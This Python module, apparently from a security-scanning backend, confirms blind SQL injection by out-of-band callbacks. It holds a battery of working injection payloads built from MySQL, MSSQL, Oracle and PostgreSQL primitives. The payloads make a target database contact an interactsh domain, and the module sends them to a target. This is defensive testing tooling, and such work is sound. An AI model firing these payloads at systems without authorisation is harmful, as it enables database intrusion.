# ==============================================================================
# Blind SQL-injection (sqli) confirmation via out-of-band (OOB) interaction — the FOURTH vuln
# type, and the THIRD to use the OOB proof shape (after SSRF and cmdi). It is CONFIRMED only by a
# REAL callback CAUSALLY tied to a payload WE injected into THIS candidate: when the target's DBMS
# parses and executes an injected SQL fragment that invokes an out-of-band primitive
# (MySQL LOAD_FILE/UNC, MSSQL xp_dirtree, Oracle UTL_INADDR/UTL_HTTP, PostgreSQL dblink), the DB
# reaches out to a UNIQUE interactsh domain we minted, and the received interaction's token must
# correspond ONE-TO-ONE to the token minted for a payload we ACTUALLY DISPATCHED on this probe. The
# interaction IS the DeterministicProof; there is no other path to CONFIRMED.
#
# INJECTION-CAUSAL CORRELATION (baked in from the start, the cmdi lesson):
#   * A UNIQUE token (fresh CSPRNG domain) is minted PER injected payload, so a received callback
#     pins to the EXACT payload that landed.
#   * A token counts only if its payload was ACTUALLY DISPATCHED to the target on this probe
#     (`injected_tokens`). A token minted but never sent, a token from a different candidate's probe,
#     or a coincidental / polluted-infra callback carrying some other session token, is NOT in
#     `injected_tokens` and therefore CANNOT confirm.
#   * TRUSTED OOB INFRASTRUCTURE IS A PRECONDITION: the guarantee is "SQL we injected into this
#     candidate drove the DBMS to make a token-matched out-of-band callback." A malicious interactsh
#     server fabricating a callback for a token it observed is out of scope (documented in SQLI.md).
#
# ADDITIVE + ISOLATED (mirrors ssrf_detector.py / cmdi_detector.py): does NOT import or touch the
# access-control path (deep_verifier / fuzzer verdict logic / confirm_render / the owner-view gate)
# and does NOT modify the shared tier framework. It COMPOSES the OOB client (`services/oob/`, REUSED,
# not forked) and the tiered-verdict framework (`services/verdict_tiers.py`), adding a sqli payload
# set + probe + detector.
#
# THE RESERVATION (why a bluff can never be CONFIRMED):
#   * `SqliOobDetector` declares `max_tier = CONFIRMED`; `classify()` enforces the ceiling.
#   * `assess()` returns CONFIRMED ONLY when the result is `confirmed` (a correlated interaction whose
#     token is in `injected_tokens`). Error-based / boolean / time-based inference is `SIGNAL` at most —
#     NEVER CONFIRMED. No signal -> REFUTED; could not probe -> NOT_DATA.
# ==============================================================================
from __future__ import annotations

import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional

from backend.app.services.oob import OOBError, OOBInteraction, OOBSession, open_session
from backend.app.services.verdict_tiers import (
    DeterministicProof, Detector, Tier, Verdict, classify,
)

# Public ProjectDiscovery interactsh servers (no self-hosting). Tried in order; the first
# that registers wins. A reachable server is REQUIRED for a real OOB confirmation.
DEFAULT_OOB_SERVERS = ("oast.online", "oast.fun", "oast.me", "oast.pro", "oast.live", "oast.site")

_HTTP_TIMEOUT = 15.0
# A response slower than this (ms) is a possible TIME-BASED BLIND inference lead -> SIGNAL (never
# CONFIRMED). High on purpose: a normal response must not trip it.
_TIME_DELAY_SIGNAL_MS = 4000.0


# ------------------------------------------------------------------------------
# Payload generation — DBMS-specific OOB primitives x injection contexts. Each embeds a UNIQUE
# domain `{d}`; a vulnerable DBMS that parses one makes an out-of-band lookup to that domain.
# ------------------------------------------------------------------------------
# Out-of-band primitives, one per DBMS family. `{d}` is the unique OOB domain (carrying the token).
_OOB_PRIMITIVES = (
    "LOAD_FILE(CONCAT('\\\\\\\\','{d}','\\\\aaa'))",     # MySQL: UNC path read -> SMB/DNS lookup
    "master..xp_dirtree('\\\\\\\\{d}\\\\aaa')",          # MSSQL: xp_dirtree UNC -> SMB/DNS
    "UTL_INADDR.get_host_address('{d}')",                # Oracle: DNS resolution
    "UTL_HTTP.request('http://{d}/')",                   # Oracle: HTTP request
    "dblink_connect('host={d} user=postgres')",          # PostgreSQL: dblink connect -> DNS on connect
)
# Injection contexts that place the primitive `{p}` into a query the DBMS will parse. Cover string,
# numeric, UNION, stacked and Oracle-concat breakouts, so at least one lands for the target's grammar.
_INJECTION_CONTEXTS = (
    "' OR {p}-- -",
    "' UNION SELECT {p}-- -",
    "'; SELECT {p};-- -",
    " OR {p}",
    "'||{p}||'",
    "; EXEC {p};-- -",
)


def _payload_templates() -> List[str]:
    """Context x DBMS-primitive templates, each still carrying a `{d}` slot for a UNIQUE OOB domain.
    The probe mints one domain (hence one token) PER template so a received callback pins to the exact
    payload injected. Pure + deterministic (order stable)."""
    out: List[str] = []
    for prim in _OOB_PRIMITIVES:
        for ctx in _INJECTION_CONTEXTS:
            out.append(ctx.replace("{p}", prim))       # e.g. "' OR UTL_INADDR.get_host_address('{d}')-- -"
    return out


def sqli_payloads(domain: str) -> List[str]:
    """The battery of blind-sqli OOB payload STRINGS for one `domain` (every template filled). Kept
    for payload-generation tests; the probe mints a UNIQUE domain per template (see `run_sqli_probe`).
    Each, if parsed by a vulnerable DBMS, drives an out-of-band lookup to `domain`. The raw strings are
    never logged (see `result_view`)."""
    return [t.replace("{d}", domain) for t in _payload_templates()]


@dataclass
class SqliProbeResult:
    """The full record of one sqli probe. CONFIRMED requires a correlated interaction whose token was
    ACTUALLY INJECTED into this candidate on this probe (`matched_token in injected_tokens`) — not
    merely minted in the session. `error_marker` / `max_response_ms` are weaker INFERENCE leads
    (error-based / time-based blind) that can reach SIGNAL at most."""
    target: str
    method: str
    param: str
    param_location: str
    oob_server: Optional[str]
    correlation_id: str = ""
    payloads_tried: int = 0
    injected_tokens: List[str] = field(default_factory=list)   # tokens whose payload was DISPATCHED
    request_status: Optional[int] = None
    request_error: Optional[str] = None
    probe_error: Optional[str] = None
    interactions: List[OOBInteraction] = field(default_factory=list)   # callbacks correlated to an INJECTED token
    matched_token: Optional[str] = None
    matched_domain: Optional[str] = None
    error_marker: bool = False               # a response body carried a SQL error (inference -> SIGNAL only)
    max_response_ms: Optional[float] = None  # slowest probe response (inference: time-based blind)
    polls: int = 0

    @property
    def confirmed(self) -> bool:
        """CONFIRMED requires a correlated interaction whose token was ACTUALLY INJECTED into this
        candidate on this probe (`matched_token in injected_tokens`) — not merely minted in the
        session. A callback for a token we never dispatched (a failed send, a different candidate's
        token, or a coincidental / polluted-infra hit) does NOT confirm."""
        return (not self.probe_error
                and bool(self.interactions)
                and self.matched_token is not None
                and self.matched_token in self.injected_tokens)

    @property
    def has_inference_signal(self) -> bool:
        """A weaker-than-proof lead: a surfaced SQL error (error-based), or a response slow enough to
        suggest a time-based blind. Never sufficient for CONFIRMED — only SIGNAL."""
        return bool(self.error_marker) or (
            self.max_response_ms is not None and self.max_response_ms >= _TIME_DELAY_SIGNAL_MS)


def _interaction_view(it: OOBInteraction) -> Dict[str, Any]:
    """A structural, secret-free view of one OOB interaction (for the proof/evidence)."""
    return {
        "protocol": it.protocol,
        "unique_id": it.unique_id,
        "q_type": it.q_type,
        "remote_address": it.remote_address,
        "timestamp": it.timestamp,
    }


# SQL error signatures across DBMS families (for the error-based INFERENCE lead -> SIGNAL only).
_SQL_ERROR_MARKERS = (
    "sql syntax", "sqlstate", "ora-", "psql:", "pg::", "mysql", "syntax error at or near",
    "unclosed quotation mark", "odbc sql", "sqlite error", "you have an error in your sql",
)


class SqliOobDetector(Detector):
    """Blind SQL injection via OOB callback. Deterministic (an injection-causal interaction is a
    physical fact), so it MAY reach CONFIRMED — but only when `assess` is handed a probe result whose
    correlated interaction is token-matched to a payload we actually injected. Error-based / time-based
    blind leads are SIGNAL; no signal -> REFUTED; could not probe -> NOT_DATA."""
    name = "sqli-oob"
    max_tier = Tier.CONFIRMED

    def assess(self, evidence: SqliProbeResult) -> Verdict:
        if evidence.probe_error:
            return Verdict.not_data(
                f"the sqli OOB probe could not run: {evidence.probe_error}. No callback could be "
                f"observed, so nothing is confirmed or refuted (NOT DATA).")
        if evidence.confirmed:
            it = evidence.interactions[0]
            proof = DeterministicProof(
                channel="sqli_oob_callback",
                basis=(f"the target's DBMS executed SQL we injected into {evidence.param!r} on this probe "
                       f"and made an out-of-band {it.protocol.upper()} callback to the unique probe domain "
                       f"{evidence.matched_domain} (interaction id {it.unique_id}"
                       + (f", q-type {it.q_type}" if it.q_type else "")
                       + (f", from {it.remote_address}" if it.remote_address else "")
                       + f") — the callback's token corresponds one-to-one to the payload we dispatched, "
                       f"proving server-side SQL execution (blind SQL injection)."))
            return Verdict.confirmed("sqli", proof)
        if evidence.has_inference_signal:
            how = "a surfaced SQL error (error-based)" if evidence.error_marker else (
                f"a response delay of ~{evidence.max_response_ms:.0f} ms (time-based blind)")
            return Verdict.signal(
                "sqli",
                f"a weaker inference lead ({how}) suggests SQL injection, but NO out-of-band callback "
                f"correlated to any of the {len(evidence.injected_tokens)} token(s) we injected into "
                f"{evidence.param!r} arrived — a SIGNAL to verify by hand, never a deterministic confirmation.")
        return Verdict.refuted(
            "sqli",
            f"no out-of-band callback correlated to any of the {len(evidence.injected_tokens)} unique "
            f"token(s) we injected into {evidence.param!r} arrived within the poll window "
            f"({evidence.polls} polls), and no inference lead was seen — the injected SQL did not drive a "
            f"DBMS-side out-of-band lookup (or the target cannot reach the interactsh server).")


def sqli_verdict(result: SqliProbeResult) -> Verdict:
    """The single emit path: run the detector through `classify` so the CONFIRMED ceiling and the
    proof requirement are structurally enforced (identical discipline to ssrf_verdict / cmdi_verdict)."""
    return classify(SqliOobDetector(), result)


# ------------------------------------------------------------------------------
# The probe: mint a UNIQUE OOB domain per injected payload, send each to the target, then poll the
# OOB session for a callback correlated to a token we actually injected.
# ------------------------------------------------------------------------------
def _open_default_session(servers) -> OOBSession:
    last: Optional[Exception] = None
    for server in servers:
        try:
            return open_session(server)
        except Exception as e:
            last = e
    raise OOBError(f"no public interactsh server reachable (tried {list(servers)}): {last}")


def _build_target_url(base_url: str, path: str, param: str, value: str) -> str:
    """Compose the target URL with `value` in a QUERY parameter (URL-encoded)."""
    base = base_url.rstrip("/")
    p = path if path.startswith("/") else "/" + path
    parts = urllib.parse.urlsplit(p)
    query = dict(urllib.parse.parse_qsl(parts.query, keep_blank_values=True))
    query[param] = value
    return f"{base}{parts.path}?{urllib.parse.urlencode(query)}"


def _default_http_send(*, target_url: str, method: str, headers: Dict[str, str],
                       body: Optional[Dict[str, Any]]) -> Dict[str, Any]:
    """Send one probe request to the TARGET (the payload is injected DATA the target's DBMS is expected
    to parse). Returns {status_code, body, elapsed_ms}. verify=False for self-signed lab/pentest targets."""
    import httpx
    with httpx.Client(timeout=_HTTP_TIMEOUT, verify=False) as client:
        start = time.monotonic()
        resp = client.request(method.upper(), target_url, headers=headers or None, json=body)
        elapsed_ms = (time.monotonic() - start) * 1000.0
        return {"status_code": resp.status_code, "body": resp.text[:4096], "elapsed_ms": elapsed_ms}


def run_sqli_probe(
    *,
    base_url: str,
    method: str = "GET",
    path: str = "/",
    param: str = "id",
    param_location: str = "query",
    oob_servers = DEFAULT_OOB_SERVERS,
    attacker_token: Optional[str] = None,
    poll_seconds: float = 25.0,
    poll_interval: float = 3.0,
    # test seams (offline; no network):
    session_factory: Optional[Callable[[], OOBSession]] = None,
    http_send: Optional[Callable[..., Dict[str, Any]]] = None,
    sleep: Callable[[float], None] = time.sleep,
) -> SqliProbeResult:
    """Confirm blind SQL injection by an injection-causal out-of-band callback. Opens an interactsh
    session, and for EACH payload variant mints a UNIQUE domain/token, injects it into `param`, and
    sends the request to the target — recording the token as INJECTED only if the send was actually
    dispatched. It then polls the OOB session and accepts ONLY a callback whose token is one we injected
    (the causal link). Also records weaker inference leads (surfaced SQL error, slow response) for a
    SIGNAL — never a confirmation. Never raises for expected failures — a probe that cannot run returns
    `probe_error` (NOT DATA)."""
    if param_location not in ("query", "body"):
        param_location = "query"
    try:
        session = (session_factory or (lambda: _open_default_session(oob_servers)))()
    except Exception as e:
        return SqliProbeResult(
            target=base_url, method=method.upper(), param=param, param_location=param_location,
            oob_server=None, probe_error=f"OOB session unavailable: {type(e).__name__}: {e}")

    result = SqliProbeResult(
        target=base_url, method=method.upper(), param=param, param_location=param_location,
        oob_server=session.server, correlation_id=session.correlation_id)
    try:
        headers: Dict[str, str] = {}
        if attacker_token:
            from backend.app.cli.external_verify import _auth_header
            headers.update(_auth_header(attacker_token))
        sender = http_send or _default_http_send
        templates = _payload_templates()
        result.payloads_tried = len(templates)

        last_status: Optional[int] = None
        for tmpl in templates:
            p = session.new_payload()                       # fresh unique domain+token per injection
            pstr = tmpl.replace("{d}", p.domain)
            if param_location == "body":
                target_url = f"{base_url.rstrip('/')}{path if path.startswith('/') else '/' + path}"
                body: Optional[Dict[str, Any]] = {param: pstr}
            else:
                target_url = _build_target_url(base_url, path, param, pstr)
                body = None
            try:
                resp = sender(target_url=target_url, method=method.upper(), headers=headers, body=body)
            except Exception as e:
                result.request_error = f"{type(e).__name__}: {e}"
                continue                                    # NOT dispatched -> token is NOT injected
            result.injected_tokens.append(p.token)          # dispatched into THIS candidate (causal link)
            if isinstance(resp, dict):
                last_status = resp.get("status_code", last_status)
                rbody = str(resp.get("body") or "").lower()
                if any(m in rbody for m in _SQL_ERROR_MARKERS):
                    result.error_marker = True              # error-based lead (inference -> SIGNAL only)
                ems = resp.get("elapsed_ms")
                if ems is not None:
                    result.max_response_ms = max(result.max_response_ms or 0.0, float(ems))
            else:
                last_status = resp
        result.request_status = last_status

        # poll for a callback correlated to a token WE ACTUALLY INJECTED (the only path to CONFIRMED).
        injected = set(result.injected_tokens)
        elapsed = 0.0
        while elapsed < poll_seconds and not result.interactions:
            sleep(poll_interval)
            elapsed += poll_interval
            result.polls += 1
            try:
                grouped = session.poll_and_correlate()
            except OOBError as e:
                result.probe_error = f"OOB poll failed: {type(e).__name__}: {e}"
                break
            for token, hits in grouped.items():
                if hits and token in injected:              # causal gate: an INJECTED token only
                    result.interactions = hits
                    result.matched_token = token
                    issued = session.issued.get(token)
                    result.matched_domain = issued.domain if issued else None
                    break
        return result
    finally:
        try:
            session.close()
        except Exception:
            pass


def result_view(result: SqliProbeResult, verdict: Verdict) -> Dict[str, Any]:
    """Machine-readable, secret-free view of a sqli probe + its tiered verdict. The raw payload STRINGS
    (weaponized SQL) and raw tokens are NOT included — only the counts (tried / actually injected) and
    the matched proof DOMAIN (which embeds only the ephemeral OOB nonce) — so nothing weaponized is logged."""
    from backend.app.services.verdict_tiers import badge
    return {
        "vuln_type": "sqli",
        "tier": verdict.tier.name.lower(),
        "badge": badge(verdict),
        "confirmed": verdict.tier is Tier.CONFIRMED,
        "basis": verdict.basis,
        "proof_channel": verdict.proof.channel if verdict.proof else None,
        "target": result.target,
        "method": result.method,
        "param": result.param,
        "param_location": result.param_location,
        "matched_domain": result.matched_domain,
        "payloads_tried": result.payloads_tried,
        "payloads_injected": len(result.injected_tokens),
        "oob_server": result.oob_server,
        "request_status": result.request_status,
        "request_error": result.request_error,
        "probe_error": result.probe_error,
        "error_marker": result.error_marker,
        "max_response_ms": result.max_response_ms,
        "polls": result.polls,
        "interactions": [_interaction_view(i) for i in result.interactions],
    }
